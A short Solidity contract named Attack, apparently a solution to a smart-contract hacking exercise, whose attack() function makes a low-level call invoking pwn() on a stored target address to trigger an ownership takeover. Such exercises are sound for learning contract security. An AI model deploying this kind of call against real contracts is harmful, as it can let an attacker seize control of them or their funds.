//SPDX-License-Identifier:MIT

pragma solidity ^0.8.2;


contract Attack{
    address public _Owner;
    constructor(address _owner){
        _Owner =_owner;
    }

    function attack()public{
        _Owner.call(abi.encodeWithSignature("pwn()"));

    }
}
